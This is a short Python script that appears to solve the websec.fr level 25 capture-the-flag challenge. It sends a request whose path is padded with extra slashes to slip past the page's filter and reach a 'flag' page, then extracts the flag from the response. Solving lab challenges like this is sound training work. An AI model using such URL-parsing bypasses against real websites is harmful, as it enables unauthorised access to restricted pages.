from requests import *

url = "https://websec.fr///level25////index.php?page=flag&send=Submit"

r = get(url).text
s = r.find("WEBSEC")
e = r.find("}", s)
flag = r[s:e+1]
print(flag)
